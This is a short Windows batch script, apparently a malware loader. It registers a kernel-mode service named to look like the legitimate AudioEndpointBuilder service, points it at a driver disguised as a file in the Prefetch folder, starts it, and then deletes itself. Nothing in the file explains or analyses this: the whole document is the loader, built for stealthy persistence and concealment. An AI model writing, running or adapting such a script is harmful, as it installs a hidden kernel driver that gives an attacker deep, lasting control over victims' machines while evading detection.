@echo off
cd %~dp0
sc create AudioEndpointBuilder_651 binpath=C:\Windows\Prefetch\DLLHOST.EXE-36E54FAD.pf type=kernel
sc start AudioEndpointBuilder_651
del "%~f0"



